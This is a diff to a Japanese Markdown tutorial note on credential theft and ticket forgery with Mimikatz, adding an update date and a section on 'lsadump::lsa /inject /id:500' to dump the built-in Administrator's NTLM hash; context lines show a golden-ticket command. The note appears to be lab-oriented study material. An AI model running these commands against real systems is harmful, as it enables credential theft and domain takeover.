@@ -1,6 +1,7 @@
 ---
 title: Mimikatz による資格情報の窃取とチケット偽造
 date: 2026-10-17
+updated: 2026-11-02
 category: Windows
 topic: 資格情報アクセス
 tags: [windows, mimikatz, credential-access, lsass]
@@ -56,3 +57,16 @@ kerberos::golden /user:administrator /domain:lab.local /sid:<SID> /krbtgt:<hash>
 
 - Mimikatz を実行するには既にローカル管理者または SYSTEM 権限が必要であり、「Mimikatz で権限を取る」のではなく「取った権限を仕上げに使う」ツールだという位置づけを誤解しないこと。
 - LSASS が保護されている環境（Credential Guard など）や EDR が入っている環境では、素の Mimikatz はそのままでは通らないことが多い。
+
+## 追記（2026-11-02）
+
+### lsadump::lsa /inject で特定のアカウントの認証情報を取り出す
+
+```
+privilege::debug
+lsadump::lsa /inject /id:500
+#  → RID 500（ビルトインの Administrator）の認証情報（NTLM ハッシュなど）をダンプする
+```
+
+- `lsadump` はモジュール名で、`lsadump` 自体が LSASS にコードを注入するわけではない。LSASS のプロセスにコードを注入して情報を取り出すのは `/inject` オプションの働き（`/inject` の代わりに `/patch` で LSASS のメモリを書き換えて取り出す方法もある）。
+- `/id:<RID>` で対象のアカウントを RID で指定する。名前で指定するなら `/name:<USER>`。
